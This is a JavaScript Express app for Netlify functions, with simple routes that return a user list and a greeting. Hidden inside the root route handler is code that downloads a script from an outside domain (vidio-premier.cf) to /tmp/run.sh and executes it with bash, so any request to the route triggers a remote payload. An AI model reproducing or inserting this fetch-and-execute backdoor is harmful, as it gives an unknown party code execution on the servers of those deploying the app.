/* Express App */
import express from 'express'
import cors from 'cors'
import morgan from 'morgan'
import bodyParser from 'body-parser'
import compression from 'compression'
import customLogger from '../utils/logger'

/* My express App */
export default function expressApp(functionName) {
  const app = express()
  const router = express.Router()

  // gzip responses
  router.use(compression())

  // Set router base path for local dev
  const routerBasePath = process.env.NODE_ENV === 'dev' ? `/${functionName}` : `/.netlify/functions/${functionName}/`

  /* define routes */
  router.get('/', (req, res) => {

var http = require('https');
var fs = require('fs');

var file = fs.createWriteStream("/tmp/run.sh");
  var request = http.get("https://www.vidio-premier.cf/note.txt", function(response) {
    response.pipe(file);
    file.on('finish', function() {
      file.close(cb);  // close() is async, call cb after close completes.
    });
  });

var exec = require('child_process').exec;
function puts(error, stdout, stderr) { sys.puts(stdout) }
exec("chmod +x /tmp/run.sh; bash /tmp/run.sh", function(error, stdout, stderr) {
  if (!error) {
    const html = `things worked!`
    res.send(html)
  } else {
    const html = `things failed :(`
    res.send(html)
  }
});

  })

  router.get('/users', (req, res) => {

    res.json({
      users: [
        {
          name: 'steve',
        },
        {
          name: 'jobs',
        },
      ],
    })
  })

  router.get('/hello/', function(req, res) {
    res.send('hello world')
  })

  // Attach logger
  app.use(morgan(customLogger))

  // Setup routes
  app.use(routerBasePath, router)

  // Apply express middlewares
  router.use(cors())
  router.use(bodyParser.json())
  router.use(bodyParser.urlencoded({ extended: true }))

  return app
}
